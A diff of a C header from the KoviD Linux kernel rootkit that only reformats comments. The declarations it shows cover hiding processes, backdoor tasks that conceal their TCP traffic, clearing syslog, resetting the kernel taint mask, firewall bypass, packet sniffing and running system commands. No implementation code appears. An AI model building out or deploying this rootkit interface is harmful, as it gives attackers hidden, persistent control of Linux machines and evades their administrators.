@@ -1,9 +1,5 @@
-/**
- * Linux Kernel version <= 5.5.0
- * - hash
- *
- *  KoviD rootkit
- */
+//  KoviD rootkit
+//  - hash
 
 #ifndef __KERNEL_ADDR_H
 #define __KERNEL_ADDR_H
@@ -24,24 +20,19 @@ typedef enum { CHILDREN, NO_CHILDREN, WHATEVER } Operation;
 struct hidden_tasks {
 	struct task_struct *task;
 
-	/** FS associated with task
-     * NULL if kernel thread
-     */
+	// FS associated with task
+	// NULL if kernel thread
 	struct fs_file_node *fnode;
 
-	/**
-     * backdoor tasks cannot
-     * be left hanging around
-     */
+	// backdoor tasks cannot
+	// be left hanging around
 	int select;
 
 	struct list_head list;
 	pid_t group;
 
-	/**
-     * It is backdoor task
-     * if source address != 0
-     */
+	// It is backdoor task
+	// if source address != 0
 	__be32 saddr;
 };
 
@@ -90,7 +81,7 @@ struct kernel_syscalls {
 
 typedef void (*decrypt_callback)(const u8 *const buf, size_t buflen,
 				 size_t copied, void *userdata);
-/** Setup crypto module */
+// Setup crypto module
 int kv_crypto_engine_init(void);
 struct kv_crypto_st *kv_crypto_mgc_init(void);
 size_t kv_encrypt(struct kv_crypto_st *, u8 *, size_t);
@@ -99,14 +90,14 @@ void kv_crypto_free_data(struct kv_crypto_st *);
 void kv_crypto_mgc_deinit(struct kv_crypto_st *);
 void kv_crypto_engine_deinit(void);
 
-/** hooks, hiding presence and so */
+// hooks, hiding presence and so
 bool sys_init(void);
 void sys_deinit(void);
 int sys_do_syslog_clear(void);
 char *sys_get_ttyfile(void);
 char *sys_get_sslfile(void);
 
-/** pid,task management */
+// pid,task management
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
 bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid);
 bool kv_find_hidden_task(struct task_struct *);
@@ -122,13 +113,13 @@ void kv_show_saved_tasks(void);
 void kv_show_all_tasks(void);
 int kv_send_signal(int, struct task_struct *);
 
-/** syscall,function addresses */
+// syscall,function addresses
 struct kernel_syscalls *kv_kall_load_addr(void);
 
-/** resets tainted_mask */
+// resets tainted_mask
 int kv_reset_tainted(unsigned long *);
 
-/** socket,networking,backdoor management */
+// socket,networking,backdoor management
 struct task_struct *kv_sock_start_sniff(void);
 bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
@@ -142,25 +133,24 @@ void kv_show_active_backdoors(void);
 bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
 
-/** proc handling */
+// proc handling
 int kv_add_proc_interface(void);
 void kv_remove_proc_interface(void);
 int kv_is_proc_interface_loaded(void);
 void kv_set_elfbits(char *);
 
-/** whatever */
 char *kv_util_random_AZ_string(size_t);
 int kv_run_system_command(char **, bool, bool);
 
-/** VM operations */
+// VM operations
 unsigned long kv_get_elf_vm_start(pid_t);
 
 enum {
 	KV_TASK,
-	/* The following indicates a backdoor
-     * task that can also hide its
-     * tcp traffic
-     */
+
+	// The following indicates a backdoor
+	// task that can also hide its
+	// tcp traffic
 	KV_TASK_BD
 };
 
